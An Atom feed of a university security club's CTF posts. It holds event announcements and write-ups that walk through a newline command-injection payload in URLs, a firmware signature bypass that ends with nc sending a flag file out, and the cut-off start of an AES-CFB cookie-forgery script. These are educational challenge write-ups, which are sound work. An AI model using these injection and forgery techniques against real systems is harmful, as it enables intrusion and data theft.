<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
<title type="text">NUS Greyhats</title>
<generator uri="https://github.com/jekyll/jekyll">Jekyll</generator>
<link rel="self" type="application/atom+xml" href="https://nusgreyhats.github.io/write-ups/feed.xml" />
<link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups" />
<updated>2017-02-24T11:23:08+08:00</updated>
<id>https://nusgreyhats.github.io/write-ups/</id>
<author>
  <name>NUS Greyhats</name>
  <uri>https://nusgreyhats.github.io/write-ups/</uri>
  <email>contact@nusgreyhats.org</email>
</author>


  

<entry>
  <title type="html"><![CDATA[X-CTF 2016 Finals by NUS Greyhats]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/xctf-finals/" />
  <id>https://nusgreyhats.github.io/write-ups/xctf-finals</id>
  <published>2016-06-30T00:00:00+08:00</published>
  <updated>2016-06-30T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;p&gt;The Cross-Varsity Capture The Flag (X-CTF) competition held on 18 June 2016 was organised by NUS Greyhats. It aims to get the participation of all tertiary institutions in Singapore, as well as allow students from various institutions, with a common interest in security, to interact with each other. At the same time, we hope that students would have fun solving these security challenges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/xctf/01.JPG&quot; alt=&quot;Solving the hardware badge challenge&quot; /&gt;
&lt;em&gt;&lt;center&gt;Solving the hardware badge challenge&lt;/center&gt;&lt;/em&gt;  &lt;/p&gt;

&lt;p&gt;Lasting 8 hours, the event saw 22 teams compete for the top 3 prizes. After all the gruelling effort solving the challenges, the following teams emerged victorious:  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/xctf/first.jpg&quot; alt=&quot;First Place&quot; /&gt;
&lt;em&gt;&lt;center&gt;First Place: Team Xiia0F1aGGer$ from NUS&lt;/center&gt;&lt;/em&gt;  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/xctf/second.jpg&quot; alt=&quot;Second Place&quot; /&gt;
&lt;em&gt;&lt;center&gt;Second Place: Team 2x0ffff5ec from NTU&lt;/center&gt;&lt;/em&gt;  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/xctf/third.jpg&quot; alt=&quot;Third Place&quot; /&gt;
&lt;em&gt;&lt;center&gt;Third Place: Team FengShui from RJC&lt;/center&gt;&lt;/em&gt;  &lt;/p&gt;

&lt;p&gt;This event would not have been possible without the support of our generous sponsors, as well as all our participants for putting in their time and effort into this competition.  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/xctf/sponsors2.jpg&quot; alt=&quot;Sponsors&quot; /&gt;
&lt;em&gt;&lt;center&gt;Our Sponsors&lt;/center&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Lastly, here’s the team that made this possible and a few others whom has helped tremendously but are not in the picture (they know who they are).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/xctf/group_photo.jpg&quot; alt=&quot;Greyhats Core Team&quot; /&gt;
&lt;em&gt;&lt;center&gt;Greyhats Core Team&lt;/center&gt;&lt;/em&gt;  &lt;/p&gt;

&lt;p&gt;For those who are still interested in trying the challenges, the source code has been made publicly available at &lt;a href=&quot;https://github.com/quanyang/x-ctf-2016-finals&quot;&gt;https://github.com/quanyang/x-ctf-2016-finals&lt;/a&gt;&lt;/p&gt;


    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/xctf-finals/&quot;&gt;X-CTF 2016 Finals by NUS Greyhats&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on June 30, 2016.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[Write ups for X-CTF 2016 Qualifiers by NUS Greyhats]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/x-ctf-2016-qualifiers-by-nus-greyhats/" />
  <id>https://nusgreyhats.github.io/write-ups/x-ctf-2016-qualifiers-by-nus-greyhats</id>
  <published>2016-04-16T19:10:17+08:00</published>
  <updated>2016-04-16T19:10:17+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;p&gt;X-CTF 2016 is a cyber security competition by NUS Greyhats that will be held in NUS School of Computing (SoC) on 18th June 2016. In the competition, student teams from various tertiary institutions will compete to solve challenges which are set by an independent body.&lt;/p&gt;

&lt;p&gt;The online qualifiers for X-CTF 2016 took place over the weekend on 9 April 2016 to 10 April 2016. 22 Teams were qualified as a result.&lt;/p&gt;

&lt;p&gt;More information can be found &lt;a href=&quot;http://www.nusgreyhats.org/x-ctf/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Many people have been asking for write ups to the challenges in X-CTF 2016. We’ll be posting the write ups to challenges incrementally over here, so do check back for updates.&lt;/p&gt;

&lt;p&gt;Challenge: xuehui&lt;br /&gt;
Difficulty: Easy&lt;br /&gt;
Points: 5&lt;br /&gt;
Write up: &lt;a href=&quot;https://natx.xyz/blog/2016/04/11/xctf-xh&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Challenge: Fact0r!z3&lt;br /&gt;
Difficulty: Easy&lt;br /&gt;
Points: 7&lt;br /&gt;
Write up: &lt;a href=&quot;http://quanyang.github.io/x-ctf-fact0r!z3-and-fact0r!z3_aga!n-crypto/&quot;&gt;quanyang.github.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Challenge: Fact0r!z3_aga!n&lt;br /&gt;
Difficulty: Moderate&lt;br /&gt;
Points: 15&lt;br /&gt;
Write up: &lt;a href=&quot;http://quanyang.github.io/x-ctf-fact0r!z3-and-fact0r!z3_aga!n-crypto/&quot;&gt;quanyang.github.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Challenge: b0verfl0w&lt;br /&gt;
Difficulty: Moderate&lt;br /&gt;
Points: 15&lt;br /&gt;
Write up: &lt;a href=&quot;http://quanyang.github.io/x-ctf-b0verfl0w-pwn/&quot;&gt;quanyang.github.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Challenge: Worm&lt;br /&gt;
Difficulty: Very Hard&lt;br /&gt;
Points: 40&lt;br /&gt;
Write up: &lt;a href=&quot;http://www.vxsecurity.sg/2016/04/15/walkthrough-x-ctf-2016-worm/&quot;&gt;VXSecurity.sg&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Challenge: The Snek&lt;br /&gt;
Difficulty: Hard&lt;br /&gt;
Points: 20&lt;br /&gt;
Write up: &lt;a href=&quot;http://nandynarwhals.org/2016/05/04/x-ctf-qualifiers-2016-the-snek-web/&quot;&gt;nandynarwhals.org&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;More will be posted soon.&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/x-ctf-2016-qualifiers-by-nus-greyhats/&quot;&gt;Write ups for X-CTF 2016 Qualifiers by NUS Greyhats&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on April 16, 2016.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[INSOMNIHACK CTF Teaser 2016 Write Up - Smartcat1]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/INSOMNIHACK-CTF-Teaser-2016-Write-Up-Smartcat1/" />
  <id>https://nusgreyhats.github.io/write-ups/INSOMNIHACK-CTF-Teaser-2016-Write-Up-Smartcat1</id>
  <published>2016-01-20T00:00:00+08:00</published>
  <updated>2016-01-20T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;h5 id=&quot;goalto-find-the-file-which-holds-information-on-the-flag&quot;&gt;Goal:	To find the file which holds information on the flag.&lt;/h5&gt;

&lt;h5 id=&quot;line-of-thought-find-a-way-to-input-multiple-commands-into-the-shell-so-that-you-can-do-other-things-like-ls-instead-of-only-just-pinging&quot;&gt;Line of thought: Find a way to input multiple commands into the shell so that you can do other things like “ls” instead of only just pinging.&lt;/h5&gt;

&lt;hr /&gt;

&lt;h5 id=&quot;utools-usedu&quot;&gt;&lt;u&gt;Tools used:&lt;/u&gt;&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;Google Chrome console&lt;/li&gt;
  &lt;li&gt;ASCII table&lt;/li&gt;
  &lt;li&gt;Some CMD knowledge &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;preparation-stage&quot;&gt;Preparation Stage&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;I started this problem by typing some things into the textbox that was available on the website. Some simple choices I started with was “localhost” and “ccc” just to see what I could ping/what would happen. I also tried some other special characters to see if I could input special commands or anything.
I managed to conclude the following based on the error messages:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;These characters are blocked:  &lt;code&gt;$;&amp;amp;|({`\t&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;The textbox acts like a bash/shell in linux, because of the ping –c 1 “xxxx” &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Next, in order to gain more information about how the form works, I inspected the page by opening up the console, and changing the form method from “POST” to “GET”, so that I could see how the form values appear in the website link. &lt;/p&gt;

&lt;p&gt;With the help of some basic command line knowledge and an ASCII table, one knows that we can type multiple commands into the shell by using “;” and “&amp;amp;&amp;amp;”, but we know that these 2 characters are blocked. Thus, the only option left is to use “\n”, also known as the newline character. Which means, insert the command into a new line. Using the ASCII table, we find that the hexadecimal value of the newline is %0A. &lt;/p&gt;

&lt;h3 id=&quot;get-the-flag-stage&quot;&gt;Get the Flag Stage&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;After that, I did a http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=localhost%0Als to list whatever was in the current directory. We see that there is a directory called “there”, but we don’t know how deep the flag is in “there” as there could be multiple subdirectories.&lt;/p&gt;

&lt;p&gt;So, I did a a http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=localhost%0Afind to list everything in the current directory (including sub-directories), and many subdirectories will show up, but only one of them is the flag. Although the deepest item does not have a file extension, there is no harm trying to cat the file to see if it contains the flag. &lt;/p&gt;

&lt;p&gt;Run something like this: &lt;a href=&quot;http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=localhost%0Acat&amp;lt;./there/.../file&quot;&gt;http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=localhost%0Acat&amp;lt;./there/…/file&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;just like how you can do something like ./a.out&amp;lt;input1.in &lt;/p&gt;

&lt;p&gt;and bingo! the flag will be displayed on the website:&lt;/p&gt;

&lt;p&gt;&lt;b&gt;INS{warm_kitty_smelly_kitty_flush_flush_flush} &lt;/b&gt;&lt;/p&gt;


    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/INSOMNIHACK-CTF-Teaser-2016-Write-Up-Smartcat1/&quot;&gt;INSOMNIHACK CTF Teaser 2016 Write Up - Smartcat1&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on January 20, 2016.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[32C3 CTF - Flash (Reversing 300)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/32C3-CTF-Flash-(Reversing-300)/" />
  <id>https://nusgreyhats.github.io/write-ups/32C3-CTF-Flash-(Reversing-300)</id>
  <published>2015-12-31T00:00:00+08:00</published>
  <updated>2015-12-31T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;p&gt;32C3 CTF is organized along with the Chaos Communication Congress in Hamburg, it started on Dec. 27, 20:00 UTC and lasted 48h until Dec. 29, 20:00 UTC.&lt;/p&gt;

&lt;h1 id=&quot;flash&quot;&gt;Flash&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 300&lt;br /&gt;
&lt;strong&gt;Category:&lt;/strong&gt; Reversing&lt;br /&gt;
&lt;strong&gt;Description&lt;/strong&gt;
This &lt;a href=&quot;https://32c3ctf.ccc.ac/uploads/flash.tgz&quot;&gt;firmware image&lt;/a&gt; is secured against manipulation using RSA and MD5. Can you still get around that protection? &lt;br /&gt;
The service is available &lt;a href=&quot;http://136.243.194.37:8001/upload.py&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;our-solution&quot;&gt;Our solution&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/32c3ctf/firmware-upload.png&quot; alt=&quot;&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’re given a gzip compressed file, which includes a sample firmware, the public key and the firmware uploading service backend script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/32c3ctf/firmware-bin.png&quot; alt=&quot;&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running file on the firmware.bin shows that it is an archive. The signature file contained in it seems to be a digital signature that is used to ensure the authenticity of the firmware.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ file firmware.bin
firmware.bin: POSIX tar archive (GNU)
$ tar vxf firmware.bin
x ./CHANGELOG
x ./firmware.img
x ./install
x ./LICENSE
x ./README
x signature&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We now take a look at the uploading service.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#!/usr/bin/env python2
import cgi
import cgitb; cgitb.enable()
import os, sys
import subprocess
import re
from Crypto.Signature import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Hash import MD5
from IPython import embed

class MD5_32C3:
  oid = MD5.new().oid
  def __init__(self, digest):
    self._digest_data = digest
  def digest(self):
    return self._digest_data

UPLOAD_DIR = &amp;quot;/tmp&amp;quot;

HTML_FORM_TEMPLATE = &amp;quot;&amp;quot;&amp;quot;
**truncated**
&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
File: &amp;lt;input name=&amp;quot;file&amp;quot; type=&amp;quot;file&amp;quot;&amp;gt;&amp;lt;br&amp;gt;
&amp;lt;input name=&amp;quot;submit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;upload!&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&amp;quot;&amp;quot;&amp;quot;

HTML_STATUS_TEMPLATE = &amp;quot;&amp;quot;&amp;quot;
**truncated**
&amp;lt;h1&amp;gt;Firmware Update Status&amp;lt;/h1&amp;gt;
%(status)s
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&amp;quot;&amp;quot;&amp;quot;

def print_html_form():
    print &amp;quot;content-type: text/html\n&amp;quot;
    print HTML_FORM_TEMPLATE

def print_html_status(status):
    print &amp;quot;content-type: text/html\n&amp;quot;
    print HTML_STATUS_TEMPLATE % {&amp;#39;status&amp;#39;: status}

def save_firmware_image():
    form = cgi.FieldStorage()
    if int(os.environ[&amp;#39;CONTENT_LENGTH&amp;#39;]) &amp;gt; 2**22:
      return False
    if not form.has_key(&amp;#39;file&amp;#39;):
      return False
    fileitem = form[&amp;#39;file&amp;#39;]
    if not fileitem.file:
      return False

    filename = os.urandom(32).encode(&amp;quot;hex&amp;quot;)
    filename = os.path.join(UPLOAD_DIR, filename)

    fout = file(filename + &amp;#39;.bin&amp;#39;, &amp;#39;wb&amp;#39;)
    while 1:
      chunk = fileitem.file.read(100000)
      if not chunk: break
      fout.write(chunk)
    fout.close()
    return filename

def calc_md5(filename):
    cmd = &amp;#39;mkdir &amp;#39; + filename + &amp;#39;; cd &amp;#39; + filename + &amp;#39;; md5calc &amp;lt; &amp;#39; + filename + &amp;#39;.bin | tar xv&amp;#39;
    result = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE).communicate()[1]
    return re.search(&amp;#39;[a-f0-9]{32}&amp;#39;, result).group(0).decode(&amp;#39;hex&amp;#39;)

def verify_sig(filename, expected_md5):
    try:
      signature = open(filename + &amp;#39;/signature&amp;#39;).read()
    except:
      return False,&amp;#39;No signature found!&amp;#39;
    try:
      pubkey = RSA.importKey(open(&amp;#39;../rsa2048pub.pem&amp;#39;).read())
    except:
      return False,&amp;#39;No pubkey found!&amp;#39;
    expected_md5 = MD5_32C3(expected_md5)
    verifier = PKCS1_v1_5.new(pubkey)
    return verifier.verify(expected_md5, signature),None

if os.environ[&amp;#39;REQUEST_METHOD&amp;#39;] == &amp;#39;GET&amp;#39;:
    print_html_form()

if os.environ[&amp;#39;REQUEST_METHOD&amp;#39;] == &amp;#39;POST&amp;#39;:
    filename = save_firmware_image()
    if not filename:
      print_html_status(&amp;#39;Invalid data received!&amp;#39;)
      sys.exit(0)
    md5 = calc_md5(filename)
    status,msg = verify_sig(filename, md5)
    if status:
      msg = &amp;#39;Signature check successul! Updating firmware... &amp;lt;br&amp;gt;&amp;#39;
      cmd = &amp;#39;cd &amp;#39; + filename + &amp;#39;; ./install&amp;#39;
      result = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE).communicate()[1]
      msg = msg + result + &amp;#39;&amp;lt;br&amp;gt;done.&amp;#39;
    if not status and not msg:
      msg = &amp;#39;Signature check failed!&amp;#39;
    print_html_status(msg)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;From the python script, we can tell that the verification process is as follows:
encrypt(md5(firmware.bin),public_key) == signature&lt;/p&gt;

&lt;p&gt;The other interesting finding is the command &lt;code&gt;cmd = &#39;cd &#39; + filename + &#39;; ./install&#39;&lt;/code&gt;. This tells us that we’ll have to modify the file &lt;code&gt;install&lt;/code&gt; to run arbitrary code in order to get the flag.&lt;/p&gt;

&lt;p&gt;Simply modifying the firmware will not work, we need to find a way to bypass the signature check. As it is a reversing challenge, and that the RSA key is 2048-bits, I did not attempt to go towards the cryptography direction. 
Instead, what is interesting is the calc_md5 function.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;def calc_md5(filename):
    cmd = &amp;#39;mkdir &amp;#39; + filename + &amp;#39;; cd &amp;#39; + filename + &amp;#39;; md5calc &amp;lt; &amp;#39; + filename + &amp;#39;.bin | tar xv&amp;#39;
    result = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE).communicate()[1]
    return re.search(&amp;#39;[a-f0-9]{32}&amp;#39;, result).group(0).decode(&amp;#39;hex&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The function uses regular expression to obtain the MD5 from the output of the subprocess command, and what is interesting is that it takes the first occurance of a 32-characters a-f0-9 string as the MD5 hash (due to &lt;code&gt;re.search().group(0)&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ ./md5calc &amp;lt; firmware.bin | tar xv
name: ./CHANGELOG, size: 1812
name: ./firmware.img, size: 1048576
./CHANGELOG
./firmware.img
name: ./install, size: 44
name: ./LICENSE, size: 576
name: ./README, size: 930
name: signature, size: 256
nb override: 512
nb override: 512
md5: a0e3c9c3262ccf420c789ed55148412c
./install
./LICENSE
./README
signature&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We see that if the firmware archive contains a file with the name of &lt;code&gt;a0e3c9c3262ccf420c789ed55148412c&lt;/code&gt;, the calc_md5 will take that as the md5 hash instead of the actual md5 hash.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ ls -la firmware3
total 4152
drwxr-xr-x 1 vagrant vagrant     374 Dec 31  2015 .
drwx------ 1 vagrant vagrant     714 Dec 31 10:56 ..
-rw-r--r-- 1 vagrant vagrant    6148 Dec 29 13:48 .DS_Store
-rw-r--r-- 1 vagrant vagrant 1055232 Dec 29 13:48 CHANGELOG
-rw-r--r-- 1 vagrant vagrant     576 Dec 26 22:37 LICENSE
-rw-r--r-- 1 vagrant vagrant     930 Dec 26 22:37 a0e3c9c3262ccf420c789ed55148412c
-rw-r--r-- 1 vagrant vagrant 1048576 Dec 26 22:37 firmware.img
-rw-r--r-- 1 vagrant vagrant 2114048 Dec 29 13:53 firmware3.bin
-rwxr-xr-x 1 vagrant vagrant      48 Dec 29 13:45 install
-rw-r--r-- 1 vagrant vagrant    2278 Dec 29 13:51 out.txt
-rw-r--r-- 1 vagrant vagrant     256 Dec 29 13:28 signature

$ python test.py firmware3
name: CHANGELOG, size: 1055232
name: LICENSE, size: 576
name: a0e3c9c3262ccf420c789ed55148412c, size: 930
name: firmware.img, size: 1048576
name: install, size: 48
name: signature, size: 256
nb override: 512
nb override: 512
md5: 8de5e3801c7758ba5e632b7c84533e8b

a0e3c9c3262ccf420c789ed55148412c
Signature check successul! Updating firmware... &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;done.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With that, we can make use of multiple ways to obtain the flag located at &lt;code&gt;/home/challenge/flag.txt&lt;/code&gt;. For me, I made use of nc to send the flag back.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/32c3ctf/flag.png&quot; alt=&quot;&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hurray!&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/32C3-CTF-Flash-(Reversing-300)/&quot;&gt;32C3 CTF - Flash (Reversing 300)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on December 31, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[HITCON CTF Quals 2015 - Simple (Crypto 100)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)/" />
  <id>https://nusgreyhats.github.io/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)</id>
  <published>2015-10-19T00:00:00+08:00</published>
  <updated>2015-10-19T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;p&gt;HITCON CTF Quals 2015 was from 17 October 2015, 10 am to 18 October 2015, 10pm. &lt;a href=&quot;https://ctftime.org/event/245&quot;&gt;CTFTIME Page&lt;/a&gt;. Most of the challenges were very tedious, and this is one of the challenges that we solved (Although we only managed to solve this after the CTF ended).&lt;/p&gt;

&lt;h1 id=&quot;simple&quot;&gt;Simple&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 100&lt;br /&gt;
&lt;strong&gt;Category:&lt;/strong&gt; Cryptography&lt;br /&gt;
&lt;strong&gt;Description&lt;/strong&gt;
Become admin!&lt;br /&gt;
&lt;a href=&quot;http://52.69.244.164:51913&quot;&gt;http://52.69.244.164:51913&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/resources/files/hitcon/simple/simple-01018f60e497b8180d6c92237e2b3a67.rb&quot;&gt;simple-01018f60e497b8180d6c92237e2b3a67.rb&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;md5&lt;/strong&gt;: 4bd00c892d5e71f6d1d25d0bff2f49ec&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;our-solution&quot;&gt;Our solution&lt;/h1&gt;

&lt;p&gt;Given the source code of the website, we’re told to get admin. Looking at the source code provided, to be able to print the flag out, we have to get the conditon r[‘admin’] to be equal to true.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;#!/usr/bin/env ruby

require &amp;#39;sinatra/base&amp;#39;
require &amp;#39;sinatra/cookies&amp;#39;
require &amp;#39;openssl&amp;#39;
require &amp;#39;json&amp;#39;

KEY = IO.binread(&amp;#39;super-secret-key&amp;#39;)
FLAG = IO.read(&amp;#39;/home/simple/flag&amp;#39;).strip

class SimpleApp &amp;lt; Sinatra::Base
  helpers Sinatra::Cookies

  get &amp;#39;/&amp;#39; do
    auth = cookies[:auth]
    if auth
      begin
        auth = auth.b
        c = OpenSSL::Cipher.new(&amp;#39;AES-128-CFB&amp;#39;)
        c.decrypt
        c.key = KEY
        c.iv = auth[0...16]
        json = c.update(auth[16..-1]) + c.final
        r = JSON.parse(json)
        if r[&amp;#39;admin&amp;#39;] == true
          &amp;quot;You&amp;#39;re admin! The flag is #{FLAG}&amp;quot;
        else
          &amp;quot;Hi #{r[&amp;#39;username&amp;#39;]}, try to get admin?&amp;quot;
        end
      rescue StandardError
        &amp;#39;Something wrong QQ&amp;#39;
      end
    else
      &amp;lt;&amp;lt;-EOS
&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;form action=&amp;#39;/&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;
&amp;lt;input type=&amp;#39;text&amp;#39; name=&amp;#39;username&amp;#39;/&amp;gt;
&amp;lt;input type=&amp;#39;password&amp;#39; name=&amp;#39;password&amp;#39;/&amp;gt;
&amp;lt;button type=&amp;#39;submit&amp;#39;&amp;gt;register!&amp;lt;/button&amp;gt;
&amp;lt;/form&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
      EOS
    end
  end

  post &amp;#39;/&amp;#39; do
    username = params[&amp;#39;username&amp;#39;]
    password = params[&amp;#39;password&amp;#39;]
    if username &amp;amp;&amp;amp; password
      data = {
        username: username,
        password: password,
        db: &amp;#39;hitcon-ctf&amp;#39;
      }
      c = OpenSSL::Cipher.new(&amp;#39;AES-128-CFB&amp;#39;)
      c.encrypt
      c.key = KEY
      iv = c.random_iv
      json = JSON.dump(data)
      enc = c.update(json) + c.final
      cookies[:auth] = iv + enc
      redirect to(&amp;#39;/&amp;#39;)
    else
      &amp;#39;Invalid input!&amp;#39;
    end
  end
end&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It seems that the IV used as well as the encrypted json is kept in the client’s cookie, and that the same cookie is used to determine if you’re an admin. (This indicates that if we can spoof the encrypted json, we can become admin)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/CFB_encryption.svg/1202px-CFB_encryption.svg.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/CFB_decryption.svg/1202px-CFB_decryption.svg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;AES-128 in CFB mode has a block size of 16 bytes.&lt;br /&gt;
Simply put,&lt;br /&gt;
Ciphertext of block #1 = E(IV, key) ^ Plaintext&lt;/p&gt;

&lt;p&gt;Therefore, with knowledge of plaintext and ciphertext, we are able to obtain E(IV, key) and to forge for the first block of cipher text.&lt;/p&gt;

&lt;p&gt;With a username and password of b, the Plaintext of the first block will be&lt;br /&gt;
&lt;code&gt;{&quot;username&quot;:&quot;b&quot;,&lt;/code&gt;&lt;br /&gt;
and we’ll use that knowledge to obtain our E(IV, key)  &lt;/p&gt;

&lt;p&gt;This is our exploit script that forges our first block to be:
&lt;code&gt;{&quot;admin&quot;: true }&lt;/code&gt;&lt;br /&gt;
and allows us to obtain our flag!&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import requests
import urllib

def main():

    original_cookie = &amp;quot;\xE9a\x89\xEC\xC7\x7C\xBC\x15\x92\xAD\xF8\x17\xF8\x40&amp;quot; \
                      &amp;quot;wV\xAB524\xF2\xF5UA\xE8\x1A\x29\xD4\xCB\xFA\xF6\xB3&amp;quot; \
                      &amp;quot;\x95h\x2B\x0D\xF4\xB9\xC8\xDB\xF8n\xB9o\xBES\x11d\xA3&amp;quot; \
                      &amp;quot;9\xA3c\x3Fi\xE7\xFA\x1C\xD0\xDBk\xDD\xD2_6\x06&amp;quot;

    original_cookie = original_cookie.encode(&amp;#39;hex&amp;#39;)
    iv = original_cookie[0:32]
    first_16_byte_block = original_cookie[32:64]
    print &amp;quot;IV: %s&amp;quot; % iv
